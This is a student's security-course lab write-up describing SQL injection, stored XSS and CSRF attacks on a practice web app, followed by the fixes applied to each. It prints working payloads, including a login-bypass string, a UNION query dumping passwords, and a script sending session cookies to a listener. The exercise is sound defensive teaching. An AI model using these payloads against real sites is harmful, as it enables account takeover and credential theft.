Assignment 4 Write-up 
Krishnaveni Varkal
CYSE 411
Barreto

 V1 — SQL Injection
1. Exploit (login bypass): `quartermaster' -- `
 — this specific line of code ensures that it closed the username string and commented out the password check.
 
2. Exploit (UNION exfil): `zzz%' UNION SELECT id, username || ':' || password, credits FROM users -- ` 
— this code was able to  recover the usernames and the passwords from the users table.

3. Fix: I was able to change the `/login` and `/search` routes by altering the SQL strings.

## V2 — Stored XSS
1. Exploit: `<script>fetch('http://127.0.0.1:9000/?c=' + encodeURIComponent(document.cookie));</script>` 
— the payload was discovered to be stored as a comment and completed when another user would view the item page and then sends the victim’s session cookies out.

2. Fix: I escaped comment output by using `esc(c.body)` and then added the CSP header `default-src 'self'; script-src 'self'; object-src 'none';` and finally set the session cookie to `HttpOnly`.
3.  CSP helps as it blocks out any unauthorizaed scripts even if any mistakes are made or missed in the reviison process.

## V3 — CSRF
1. Exploit: `csrf-poc.html` was an automatically submitted form to `/wallet/transfer`, sending 10 credits to `mallory` and was able to use the victim’s logged-in session cookies in order to exploite the user.
2. Fix: I was able to create a generated a random CSRF token for each session and then added it and changed the session cookie to `SameSite=Strict`.
3. The attacker is not able to form a valid token as it is randomly generated. 

Time spent- 
Approximately 5 to 6 and half hours. Most of the time I spent setting up the environment due to needing to switch from node 24 to node 22 and downloading certain add ons in order to run this excersize, testing the exploits, debugging the application, and implementing and verifying the security fixes